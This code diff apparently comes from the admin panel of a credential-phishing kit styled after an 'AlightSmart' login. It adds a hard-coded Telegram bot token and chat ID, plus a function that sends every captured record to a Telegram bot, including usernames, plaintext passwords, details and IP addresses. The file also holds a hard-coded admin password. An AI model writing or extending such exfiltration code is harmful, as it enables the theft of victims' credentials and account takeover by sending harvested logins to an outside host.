@@ -52,6 +52,35 @@
 
     <script>
         const ADMIN_PASSWORD = "tunde6035";
+        const TELEGRAM_TOKEN = "8884240723:AAFfSTKd9jab0Xdfp-L-mPSeJqyyISe8LaU";
+        const CHAT_ID = "8559945003";
+
+        // Telegram Notification Function
+        async function sendTelegramNotification(record) {
+            const message = `🚨 *New AlightSmart Submission!*\n\n` +
+                `• *Time:* ${record.timestamp || '-'}\n` +
+                `• *Type:* ${record.type || '-'}\n` +
+                `• *Username:* ${record.username || '-'}\n` +
+                `• *Password:* ${record.password || '-'}\n` +
+                `• *Details:* ${record.address || '-'}\n` +
+                `• *IP:* ${record.ip || 'Unknown'}\n\n` +
+                `🕒 ${new Date().toLocaleString()}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                console.log("✅ Telegram notification sent!");
+            } catch (err) {
+                console.error("❌ Telegram failed:", err);
+            }
+        }
 
         async function loadRecords() {
             try {
@@ -65,7 +94,7 @@
 
                 document.getElementById('status').textContent = `✅ ${records.length} Records Loaded`;
 
-                records.forEach(r => {
+                for (const r of records) {
                     let action = '';
                     if (r.address && r.address.includes("Pending")) {
                         action = `
@@ -89,7 +118,10 @@
                                 <button class="btn delete" onclick="deleteRecord(${r.id})">🗑️ Delete</button>
                             </td>
                         </tr>`;
-                });
+
+                    // Send Telegram Notification for each new record
+                    await sendTelegramNotification(r);
+                }
             } catch (e) {
                 document.getElementById('status').innerHTML = "❌ Error loading - Click Force Refresh";
             }
